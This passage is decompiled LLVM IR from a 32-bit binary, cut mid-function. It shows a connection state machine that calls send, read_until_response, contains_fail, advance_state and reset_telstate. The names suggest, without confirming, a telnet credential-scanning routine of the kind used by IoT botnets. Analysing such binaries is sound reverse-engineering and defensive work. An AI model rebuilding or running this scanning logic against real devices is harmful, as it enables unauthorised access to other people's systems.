  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804cf20 = load i32, i32* %v3_804cdd7, align 4
  store i32 %v4_804cf20, i32* %eax.global-to-local, align 4
  %v2_804cf26 = add i32 %v0_804cf02, 8
  %v3_804cf26 = inttoptr i32 %v2_804cf26 to i32*
  store i32 %v13_804cf07, i32* %v3_804cf26, align 4
  %v1_804cf27 = add i32 %v0_804cf02, 4
  %v2_804cf27 = inttoptr i32 %v1_804cf27 to i32*
  store i32 4, i32* %v2_804cf27, align 4
  %v0_804cf29 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cf29 = inttoptr i32 %v0_804cf02 to i32*
  store i32 %v0_804cf29, i32* %v3_804cf29, align 4
  %v0_804cf2a = load i32, i32* %stack_var_-332, align 4
  %v1_804cf2a = load i32, i32* %stack_var_-328, align 4
  %v2_804cf2a = load i32, i32* %stack_var_-324, align 4
  %v3_804cf2a = call i32 @__libc_fcntl(i32 %v0_804cf2a, i32 %v1_804cf2a, i32 %v2_804cf2a)
  %v0_804cf2f = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804cf4e = add i32 %v0_804cf2f, 4
  %v2_804cf4e = inttoptr i32 %v1_804cf4e to i32*
  store i32 2, i32* %v2_804cf4e, align 4
  %v0_804cf50 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cf50 = inttoptr i32 %v0_804cf2f to i32*
  store i32 %v0_804cf50, i32* %v3_804cf50, align 4
  %v0_804cf51 = load i32, i32* %stack_var_-332, align 4
  %v1_804cf51 = load i32, i32* %stack_var_-328, align 4
  %v2_804cf51 = inttoptr i32 %v0_804cf51 to i32*
  %v3_804cf51 = call i32 @advance_state(i32* %v2_804cf51, i32 %v1_804cf51)
  store i32 %v3_804cf51, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804cf5e:                             ; preds = %dec_label_pc_804cda8
  %v13_804cf5e = icmp eq i32 %v5_804ce48, -1
  %v1_804cf62 = icmp eq i1 %v13_804cf5e, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804cf62, label %dec_label_pc_804cf8e, label %dec_label_pc_804cf64

dec_label_pc_804cf64:                             ; preds = %dec_label_pc_804cf5e
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v2_804cf80 = add i32 %v0_804ce4d, 16
  %v3_804cf80 = inttoptr i32 %v2_804cf80 to i32*
  store i32 %v2_804c9be, i32* %v3_804cf80, align 4
  %v1_804cf81 = call i32 @reset_telstate(i32 %v5_804ce48)
  store i32 %v1_804cf81, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804cf8e:                             ; preds = %dec_label_pc_804cf5e
  store i32 %v1_804c9c0, i32* %eax.global-to-local, align 4
  %v2_804cfa9 = load i32, i32* %v1_804c9c3, align 4
  store i32 %v2_804cfa9, i32* %eax.global-to-local, align 4
  %v1_804cfab = add i32 %v2_804cfa9, 5
  store i32 %v1_804cfab, i32* @ebx, align 4
  %v1_804cfb1 = add i32 %v0_804ce4d, 16
  %v2_804cfb1 = inttoptr i32 %v1_804cfb1 to i32*
  store i32 0, i32* %v2_804cfb1, align 4
  %v1_804cfb3 = inttoptr i32 %v5_804ce48 to i32*
  %v2_804cfb3 = call i32 @__GI_time(i32* %v1_804cfb3)
  store i32 %v2_804cfb3, i32* %eax.global-to-local, align 4
  %v0_804cfbb = load i32, i32* @ebx, align 4
  %v7_804cfbb = icmp ult i32 %v0_804cfbb, %v2_804cfb3
  %v1_804cfbd = icmp eq i1 %v7_804cfbb, false
  br i1 %v1_804cfbd, label %dec_label_pc_804d8eb, label %dec_label_pc_804cfc3

dec_label_pc_804cfc3:                             ; preds = %dec_label_pc_804cf8e
  %v0_804cfb8 = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804cfdf = inttoptr i32 %v0_804cfb8 to i32*
  store i32 %v2_804c9be, i32* %v3_804cfdf, align 4
  %v0_804cfe0 = load i32, i32* %stack_var_-332, align 4
  %v1_804cfe0 = call i32 @reset_telstate(i32 %v0_804cfe0)
  store i32 %v1_804cfe0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804cfed:                             ; preds = %dec_label_pc_804c9f7
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  %v1_804d005 = add i32 %v2_804c9be, 24
  store i32 %v1_804d005, i32* %eax.global-to-local, align 4
  %v1_804d008 = inttoptr i32 %v1_804d005 to i32*
  %v2_804d008 = load i32, i32* %v1_804d008, align 4
  store i32 %v2_804d008, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d020 = inttoptr i32 %v2_804c9be to i32*
  %v4_804d020 = load i32, i32* %v3_804d020, align 4
  store i32 %v4_804d020, i32* %eax.global-to-local, align 4
  %v0_804d023 = load i32, i32* @esp, align 4
  %v1_804d026 = add i32 %v0_804d023, -16
  %v2_804d026 = inttoptr i32 %v1_804d026 to i32*
  store i32 134590956, i32* %v2_804d026, align 4
  %v1_804d02b = add i32 %v0_804d023, -20
  %v2_804d02b = inttoptr i32 %v1_804d02b to i32*
  store i32 512, i32* %v2_804d02b, align 4
  %v0_804d030 = load i32, i32* @ebx, align 4
  %v2_804d030 = add i32 %v0_804d023, -24
  %v3_804d030 = inttoptr i32 %v2_804d030 to i32*
  store i32 %v0_804d030, i32* %v3_804d030, align 4
  %v5_804d031 = add i32 %v0_804d023, -28
  %v6_804d031 = inttoptr i32 %v5_804d031 to i32*
  store i32 %arg1, i32* %v6_804d031, align 4
  %v0_804d034 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d034 = add i32 %v0_804d023, -32
  %v3_804d034 = inttoptr i32 %v2_804d034 to i32*
  store i32 %v0_804d034, i32* %v3_804d034, align 4
  %v1_804d035 = call i32 @read_until_response(i32 %v6_804ca0d)
  %v0_804d03a = load i32, i32* @esp, align 4
  %v1_804d03d = icmp eq i32 %v1_804d035, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  br i1 %v1_804d03d, label %dec_label_pc_804d0ca, label %dec_label_pc_804d045

dec_label_pc_804d045:                             ; preds = %dec_label_pc_804cfed
  store i32 %v1_804d005, i32* %eax.global-to-local, align 4
  %v2_804d060 = load i32, i32* %v1_804d008, align 4
  store i32 %v2_804d060, i32* %eax.global-to-local, align 4
  %v2_804d065 = add i32 %v0_804d03a, 16
  %v3_804d065 = inttoptr i32 %v2_804d065 to i32*
  store i32 %v2_804d060, i32* %v3_804d065, align 4
  %v0_804d066 = load i32, i32* %stack_var_-332, align 4
  %v1_804d066 = call i32 @contains_fail(i32 %v0_804d066)
  %v0_804d06b = load i32, i32* @esp, align 4
  %v1_804d06e = icmp eq i32 %v1_804d066, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804d0ba = add i32 %v0_804d06b, 4
  %v2_804d0ba = inttoptr i32 %v1_804d0ba to i32*
  br i1 %v1_804d06e, label %dec_label_pc_804d09e, label %dec_label_pc_804d072

dec_label_pc_804d072:                             ; preds = %dec_label_pc_804d045
  store i32 0, i32* %v2_804d0ba, align 4
  %v0_804d090 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d090 = inttoptr i32 %v0_804d06b to i32*
  store i32 %v0_804d090, i32* %v3_804d090, align 4
  %v0_804d091 = load i32, i32* %stack_var_-332, align 4
  %v1_804d091 = load i32, i32* %stack_var_-328, align 4
  %v2_804d091 = inttoptr i32 %v0_804d091 to i32*
  %v3_804d091 = call i32 @advance_state(i32* %v2_804d091, i32 %v1_804d091)
  store i32 %v3_804d091, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d09e:                             ; preds = %dec_label_pc_804d045
  store i32 3, i32* %v2_804d0ba, align 4
  %v0_804d0bc = load i32, i32* %eax.global-to-local, align 4
  %v3_804d0bc = inttoptr i32 %v0_804d06b to i32*
  store i32 %v0_804d0bc, i32* %v3_804d0bc, align 4
  %v0_804d0bd = load i32, i32* %stack_var_-332, align 4
  %v1_804d0bd = load i32, i32* %stack_var_-328, align 4
  %v2_804d0bd = inttoptr i32 %v0_804d0bd to i32*
  %v3_804d0bd = call i32 @advance_state(i32* %v2_804d0bd, i32 %v1_804d0bd)
  store i32 %v3_804d0bd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d0ca:                             ; preds = %dec_label_pc_804cfed
  store i32 %v1_804c9c0, i32* %eax.global-to-local, align 4
  %v2_804d0e5 = load i32, i32* %v1_804c9c3, align 4
  store i32 %v2_804d0e5, i32* %eax.global-to-local, align 4
  %v1_804d0e7 = add i32 %v2_804d0e5, 7
  store i32 %v1_804d0e7, i32* @ebx, align 4
  %v1_804d0ed = add i32 %v0_804d03a, 16
  %v2_804d0ed = inttoptr i32 %v1_804d0ed to i32*
  store i32 0, i32* %v2_804d0ed, align 4
  %v0_804d0ef = load i32, i32* %stack_var_-332, align 4
  %v1_804d0ef = inttoptr i32 %v0_804d0ef to i32*
  %v2_804d0ef = call i32 @__GI_time(i32* %v1_804d0ef)
  store i32 %v2_804d0ef, i32* %eax.global-to-local, align 4
  %v0_804d0f7 = load i32, i32* @ebx, align 4
  %v7_804d0f7 = icmp ult i32 %v0_804d0f7, %v2_804d0ef
  %v1_804d0f9 = icmp eq i1 %v7_804d0f7, false
  br i1 %v1_804d0f9, label %dec_label_pc_804d8eb, label %dec_label_pc_804d0ff

dec_label_pc_804d0ff:                             ; preds = %dec_label_pc_804d0ca
  %v0_804d0f4 = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d11b = inttoptr i32 %v0_804d0f4 to i32*
  store i32 %v2_804c9be, i32* %v3_804d11b, align 4
  %v0_804d11c = load i32, i32* %stack_var_-332, align 4
  %v1_804d11c = call i32 @reset_telstate(i32 %v0_804d11c)
  store i32 %v1_804d11c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d129:                             ; preds = %dec_label_pc_804c9f7
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d13f = add i32 %v2_804cb79, %v2_804c9bc
  %v4_804d13f = inttoptr i32 %v3_804d13f to i8*
  %v5_804d13f = load i8, i8* %v4_804d13f, align 2
  %v6_804d13f = zext i8 %v5_804d13f to i32
  store i32 %v6_804d13f, i32* %eax.global-to-local, align 4
  %v1_804d148 = mul nuw nsw i32 %v6_804d13f, 4
  %v2_804d148 = add nuw nsw i32 %v1_804d148, 134590884
  %v3_804d148 = inttoptr i32 %v2_804d148 to i32*
  %v4_804d148 = load i32, i32* %v3_804d148, align 4
  %v1_804d15a = and i32 %v4_804d148, -256
  store i32 %v1_804d15a, i32* %eax.global-to-local, align 4
  %v4_804d15d = inttoptr i32 %v4_804d148 to i8*
  store i32 %v4_804d148, i32* @edi, align 4
  %v3_804d163 = call i32 @_strlen(i8* %v4_804d15d)
  store i32 %v3_804d163, i32* @esi, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v5_804d182 = load i8, i8* %v4_804d13f, align 2
  %v6_804d182 = zext i8 %v5_804d182 to i32
  store i32 %v6_804d182, i32* %eax.global-to-local, align 4
  %v1_804d18b = mul nuw nsw i32 %v6_804d182, 4
  %v2_804d18b = add nuw nsw i32 %v1_804d18b, 134590884
  %v3_804d18b = inttoptr i32 %v2_804d18b to i32*
  %v4_804d18b = load i32, i32* %v3_804d18b, align 4
  store i32 %v4_804d18b, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d1a8 = inttoptr i32 %v2_804c9be to i32*
  %v4_804d1a8 = load i32, i32* %v3_804d1a8, align 4
  store i32 %v4_804d1a8, i32* %eax.global-to-local, align 4
  %v0_804d1ab = load i32, i32* @esp, align 4
  %v1_804d1ab = add i32 %v0_804d1ab, -4
  %v2_804d1ab = inttoptr i32 %v1_804d1ab to i32*
  store i32 16384, i32* %v2_804d1ab, align 4
  %v0_804d1b0 = load i32, i32* @esi, align 4
  %v2_804d1b0 = add i32 %v0_804d1ab, -8
  %v3_804d1b0 = inttoptr i32 %v2_804d1b0 to i32*
  store i32 %v0_804d1b0, i32* %v3_804d1b0, align 4
  %v0_804d1b1 = load i32, i32* @ebx, align 4
  %v2_804d1b1 = add i32 %v0_804d1ab, -12
  %v3_804d1b1 = inttoptr i32 %v2_804d1b1 to i32*
  store i32 %v0_804d1b1, i32* %v3_804d1b1, align 4
  %v0_804d1b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d1b2 = add i32 %v0_804d1ab, -16
  %v3_804d1b2 = inttoptr i32 %v2_804d1b2 to i32*
  store i32 %v0_804d1b2, i32* %v3_804d1b2, align 4
  %v4_804d1b3 = call i32 @__libc_send(i32 %v4_804d148, i32 %v2_804c8c7, i32 %v6_804ca0d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804d1b3, i32* %eax.global-to-local, align 4
  %v0_804d1b8 = load i32, i32* @esp, align 4
  %v2_804d1bb = icmp slt i32 %v4_804d1b3, 0
  %v1_804d1bd = icmp eq i1 %v2_804d1bb, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804d1bd, label %dec_label_pc_804d1e9, label %dec_label_pc_804d1bf

dec_label_pc_804d1bf:                             ; preds = %dec_label_pc_804d129
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d1db = inttoptr i32 %v0_804d1b8 to i32*
  store i32 %v2_804c9be, i32* %v3_804d1db, align 4
  %v1_804d1dc = call i32 @reset_telstate(i32 %v4_804d148)
  store i32 %v1_804d1dc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d1e9:                             ; preds = %dec_label_pc_804d129
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804d1ff = load i32, i32* %v3_804d1a8, align 4
  store i32 %v4_804d1ff, i32* %eax.global-to-local, align 4
  %v1_804d202 = add i32 %v0_804d1b8, 12
  %v2_804d202 = inttoptr i32 %v1_804d202 to i32*
  store i32 16384, i32* %v2_804d202, align 4
  %v1_804d207 = add i32 %v0_804d1b8, 8
  %v2_804d207 = inttoptr i32 %v1_804d207 to i32*
  store i32 2, i32* %v2_804d207, align 4
  %v1_804d209 = add i32 %v0_804d1b8, 4
  %v2_804d209 = inttoptr i32 %v1_804d209 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_805896f.256 to i32), i32* %v2_804d209, align 4
  %v0_804d20e = load i32, i32* %eax.global-to-local, align 4
  %v3_804d20e = inttoptr i32 %v0_804d1b8 to i32*
  store i32 %v0_804d20e, i32* %v3_804d20e, align 4
  %v4_804d20f = call i32 @__libc_send(i32 %v4_804d148, i32 %v2_804c8c7, i32 %v6_804ca0d, i32 ptrtoint (i32* @0 to i32))
  %v0_804d214 = load i32, i32* @esp, align 4
  %v2_804d217 = icmp slt i32 %v4_804d20f, 0
  %v1_804d219 = icmp eq i1 %v2_804d217, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  br i1 %v1_804d219, label %dec_label_pc_804d245, label %dec_label_pc_804d21b

dec_label_pc_804d21b:                             ; preds = %dec_label_pc_804d1e9
  %v3_804d237 = inttoptr i32 %v0_804d214 to i32*
  store i32 %v2_804c9be, i32* %v3_804d237, align 4
  %v1_804d238 = call i32 @reset_telstate(i32 %v4_804d148)
  store i32 %v1_804d238, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d245:                             ; preds = %dec_label_pc_804d1e9
  %v1_804d261 = add i32 %v0_804d214, 4
  %v2_804d261 = inttoptr i32 %v1_804d261 to i32*
  store i32 4, i32* %v2_804d261, align 4
  %v0_804d263 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d263 = inttoptr i32 %v0_804d214 to i32*
  store i32 %v0_804d263, i32* %v3_804d263, align 4
  %v2_804d264 = inttoptr i32 %v4_804d148 to i32*
  %v3_804d264 = call i32 @advance_state(i32* %v2_804d264, i32 %v2_804c8c7)
  store i32 %v3_804d264, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d271:                             ; preds = %dec_label_pc_804c9f7
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  %v1_804d289 = add i32 %v2_804c9be, 24
  store i32 %v1_804d289, i32* %eax.global-to-local, align 4
  %v1_804d28c = inttoptr i32 %v1_804d289 to i32*
  %v2_804d28c = load i32, i32* %v1_804d28c, align 4
  store i32 %v2_804d28c, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d2a4 = inttoptr i32 %v2_804c9be to i32*
  %v4_804d2a4 = load i32, i32* %v3_804d2a4, align 4
  store i32 %v4_804d2a4, i32* %eax.global-to-local, align 4
  %v0_804d2a7 = load i32, i32* @esp, align 4
  %v1_804d2aa = add i32 %v0_804d2a7, -16
  %v2_804d2aa = inttoptr i32 %v1_804d2aa to i32*
  store i32 ptrtoint (i32* @global_var_805b1ec to i32), i32* %v2_804d2aa, align 4
  %v1_804d2af = add i32 %v0_804d2a7, -20
  %v2_804d2af = inttoptr i32 %v1_804d2af to i32*
  store i32 512, i32* %v2_804d2af, align 4
  %v0_804d2b4 = load i32, i32* @ebx, align 4
  %v2_804d2b4 = add i32 %v0_804d2a7, -24
  %v3_804d2b4 = inttoptr i32 %v2_804d2b4 to i32*
  store i32 %v0_804d2b4, i32* %v3_804d2b4, align 4
  %v5_804d2b5 = add i32 %v0_804d2a7, -28
  %v6_804d2b5 = inttoptr i32 %v5_804d2b5 to i32*
  store i32 %arg1, i32* %v6_804d2b5, align 4
  %v0_804d2b8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d2b8 = add i32 %v0_804d2a7, -32
  %v3_804d2b8 = inttoptr i32 %v2_804d2b8 to i32*
  store i32 %v0_804d2b8, i32* %v3_804d2b8, align 4
  %v1_804d2b9 = call i32 @read_until_response(i32 %v6_804ca0d)
  %v0_804d2be = load i32, i32* @esp, align 4
  %v1_804d2c1 = icmp eq i32 %v1_804d2b9, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  br i1 %v1_804d2c1, label %dec_label_pc_804d34e, label %dec_label_pc_804d2c9

dec_label_pc_804d2c9:                             ; preds = %dec_label_pc_804d271
  store i32 %v1_804d289, i32* %eax.global-to-local, align 4
  %v2_804d2e4 = load i32, i32* %v1_804d28c, align 4
  store i32 %v2_804d2e4, i32* %eax.global-to-local, align 4
  %v2_804d2e9 = add i32 %v0_804d2be, 16
  %v3_804d2e9 = inttoptr i32 %v2_804d2e9 to i32*
  store i32 %v2_804d2e4, i32* %v3_804d2e9, align 4
  %v1_804d2ea = call i32 @contains_fail(i32 %stack_var_-620.244)
  %v0_804d2ef = load i32, i32* @esp, align 4
  %v1_804d2f2 = icmp eq i32 %v1_804d2ea, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804d33e = add i32 %v0_804d2ef, 4
  %v2_804d33e = inttoptr i32 %v1_804d33e to i32*
  br i1 %v1_804d2f2, label %dec_label_pc_804d322, label %dec_label_pc_804d2f6

dec_label_pc_804d2f6:                             ; preds = %dec_label_pc_804d2c9
  store i32 0, i32* %v2_804d33e, align 4
  %v0_804d314 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d314 = inttoptr i32 %v0_804d2ef to i32*
  store i32 %v0_804d314, i32* %v3_804d314, align 4
  %v2_804d315 = inttoptr i32 %stack_var_-620.244 to i32*
  %v3_804d315 = call i32 @advance_state(i32* %v2_804d315, i32 %v2_804c8c7)
  store i32 %v3_804d315, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d322:                             ; preds = %dec_label_pc_804d2c9
  store i32 5, i32* %v2_804d33e, align 4
  %v0_804d340 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d340 = inttoptr i32 %v0_804d2ef to i32*
  store i32 %v0_804d340, i32* %v3_804d340, align 4
  %v2_804d341 = inttoptr i32 %stack_var_-620.244 to i32*
  %v3_804d341 = call i32 @advance_state(i32* %v2_804d341, i32 %v2_804c8c7)
  store i32 %v3_804d341, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d34e:                             ; preds = %dec_label_pc_804d271
  store i32 %v1_804c9c0, i32* %eax.global-to-local, align 4
  %v2_804d369 = load i32, i32* %v1_804c9c3, align 4
  store i32 %v2_804d369, i32* %eax.global-to-local, align 4
  %v1_804d36b = add i32 %v2_804d369, 3
  store i32 %v1_804d36b, i32* @ebx, align 4
  %v1_804d371 = add i32 %v0_804d2be, 16
  %v2_804d371 = inttoptr i32 %v1_804d371 to i32*
  store i32 0, i32* %v2_804d371, align 4
  %v1_804d373 = inttoptr i32 %stack_var_-620.244 to i32*
  %v2_804d373 = call i32 @__GI_time(i32* %v1_804d373)
  store i32 %v2_804d373, i32* %eax.global-to-local, align 4
  %v0_804d37b = load i32, i32* @ebx, align 4
  %v7_804d37b = icmp ult i32 %v0_804d37b, %v2_804d373
  %v1_804d37d = icmp eq i1 %v7_804d37b, false
  br i1 %v1_804d37d, label %dec_label_pc_804d8eb, label %dec_label_pc_804d383

dec_label_pc_804d383:                             ; preds = %dec_label_pc_804d34e
  %v0_804d378 = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d39f = inttoptr i32 %v0_804d378 to i32*
  store i32 %v2_804c9be, i32* %v3_804d39f, align 4
  %v1_804d3a0 = call i32 @reset_telstate(i32 %stack_var_-620.244)
  store i32 %v1_804d3a0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d3ad:                             ; preds = %dec_label_pc_804c9f7
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d3c3 = add i32 %v2_804cb3f, %v2_804c9bc
  %v4_804d3c3 = inttoptr i32 %v3_804d3c3 to i8*
  %v5_804d3c3 = load i8, i8* %v4_804d3c3, align 1
  %v6_804d3c3 = zext i8 %v5_804d3c3 to i32
  store i32 %v6_804d3c3, i32* %eax.global-to-local, align 4
  %v1_804d3cc = mul nuw nsw i32 %v6_804d3c3, 4
  %v2_804d3cc = add nuw nsw i32 %v1_804d3cc, 134590896
  %v3_804d3cc = inttoptr i32 %v2_804d3cc to i32*
  %v4_804d3cc = load i32, i32* %v3_804d3cc, align 4
  %v1_804d3de = and i32 %v4_804d3cc, -256
  store i32 %v1_804d3de, i32* %eax.global-to-local, align 4
  %v4_804d3e1 = inttoptr i32 %v4_804d3cc to i8*
  store i32 %v4_804d3cc, i32* @edi, align 4
  %v3_804d3e7 = call i32 @_strlen(i8* %v4_804d3e1)
  store i32 %v3_804d3e7, i32* @esi, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v5_804d406 = load i8, i8* %v4_804d3c3, align 1
  %v6_804d406 = zext i8 %v5_804d406 to i32
  store i32 %v6_804d406, i32* %eax.global-to-local, align 4
  %v1_804d40f = mul nuw nsw i32 %v6_804d406, 4
  %v2_804d40f = add nuw nsw i32 %v1_804d40f, 134590896
  %v3_804d40f = inttoptr i32 %v2_804d40f to i32*
  %v4_804d40f = load i32, i32* %v3_804d40f, align 4
  store i32 %v4_804d40f, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d42c = inttoptr i32 %v2_804c9be to i32*
  %v4_804d42c = load i32, i32* %v3_804d42c, align 4
  store i32 %v4_804d42c, i32* %eax.global-to-local, align 4
  %v0_804d42f = load i32, i32* @esp, align 4
  %v1_804d42f = add i32 %v0_804d42f, -4
  %v2_804d42f = inttoptr i32 %v1_804d42f to i32*
  store i32 16384, i32* %v2_804d42f, align 4
  %v0_804d434 = load i32, i32* @esi, align 4
  %v2_804d434 = add i32 %v0_804d42f, -8
  %v3_804d434 = inttoptr i32 %v2_804d434 to i32*
  store i32 %v0_804d434, i32* %v3_804d434, align 4
  %v0_804d435 = load i32, i32* @ebx, align 4
  %v2_804d435 = add i32 %v0_804d42f, -12
  %v3_804d435 = inttoptr i32 %v2_804d435 to i32*
  store i32 %v0_804d435, i32* %v3_804d435, align 4
  %v0_804d436 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d436 = add i32 %v0_804d42f, -16
  %v3_804d436 = inttoptr i32 %v2_804d436 to i32*
  store i32 %v0_804d436, i32* %v3_804d436, align 4
  %v4_804d437 = call i32 @__libc_send(i32 %v4_804d3cc, i32 %stack_var_-620.244, i32 %v2_804c8c7, i32 %v6_804ca0d)
  store i32 %v4_804d437, i32* %eax.global-to-local, align 4
  %v0_804d43c = load i32, i32* @esp, align 4
  %v2_804d43f = icmp slt i32 %v4_804d437, 0
  %v1_804d441 = icmp eq i1 %v2_804d43f, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804d441, label %dec_label_pc_804d46d, label %dec_label_pc_804d443

dec_label_pc_804d443:                             ; preds = %dec_label_pc_804d3ad
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d45f = inttoptr i32 %v0_804d43c to i32*
  store i32 %v2_804c9be, i32* %v3_804d45f, align 4
  %v1_804d460 = call i32 @reset_telstate(i32 %v4_804d3cc)
  store i32 %v1_804d460, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d46d:                             ; preds = %dec_label_pc_804d3ad
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804d483 = load i32, i32* %v3_804d42c, align 4
  store i32 %v4_804d483, i32* %eax.global-to-local, align 4
  %v1_804d486 = add i32 %v0_804d43c, 12
  %v2_804d486 = inttoptr i32 %v1_804d486 to i32*
  store i32 16384, i32* %v2_804d486, align 4
  %v1_804d48b = add i32 %v0_804d43c, 8
  %v2_804d48b = inttoptr i32 %v1_804d48b to i32*
  store i32 2, i32* %v2_804d48b, align 4
  %v1_804d48d = add i32 %v0_804d43c, 4
  %v2_804d48d = inttoptr i32 %v1_804d48d to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_805896f.256 to i32), i32* %v2_804d48d, align 4
  %v0_804d492 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d492 = inttoptr i32 %v0_804d43c to i32*
  store i32 %v0_804d492, i32* %v3_804d492, align 4
  %v4_804d493 = call i32 @__libc_send(i32 %v4_804d3cc, i32 %stack_var_-620.244, i32 %v2_804c8c7, i32 %v6_804ca0d)
  %v0_804d498 = load i32, i32* @esp, align 4
  %v2_804d49b = icmp slt i32 %v4_804d493, 0
  %v1_804d49d = icmp eq i1 %v2_804d49b, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  br i1 %v1_804d49d, label %dec_label_pc_804d4c9, label %dec_label_pc_804d49f

dec_label_pc_804d49f:                             ; preds = %dec_label_pc_804d46d
  %v3_804d4bb = inttoptr i32 %v0_804d498 to i32*
  store i32 %v2_804c9be, i32* %v3_804d4bb, align 4
  %v1_804d4bc = call i32 @reset_telstate(i32 %v4_804d3cc)
  store i32 %v1_804d4bc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d4c9:                             ; preds = %dec_label_pc_804d46d
  %v1_804d4e5 = add i32 %v0_804d498, 4
  %v2_804d4e5 = inttoptr i32 %v1_804d4e5 to i32*
  store i32 6, i32* %v2_804d4e5, align 4
  %v0_804d4e7 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d4e7 = inttoptr i32 %v0_804d498 to i32*
  store i32 %v0_804d4e7, i32* %v3_804d4e7, align 4
  %v2_804d4e8 = inttoptr i32 %v4_804d3cc to i32*
  %v3_804d4e8 = call i32 @advance_state(i32* %v2_804d4e8, i32 %stack_var_-620.244)
  store i32 %v3_804d4e8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d4f5:                             ; preds = %dec_label_pc_804c9f7
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  %v1_804d50d = add i32 %v2_804c9be, 24
  store i32 %v1_804d50d, i32* %eax.global-to-local, align 4
  %v1_804d510 = inttoptr i32 %v1_804d50d to i32*
  %v2_804d510 = load i32, i32* %v1_804d510, align 4
  store i32 %v2_804d510, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d528 = inttoptr i32 %v2_804c9be to i32*
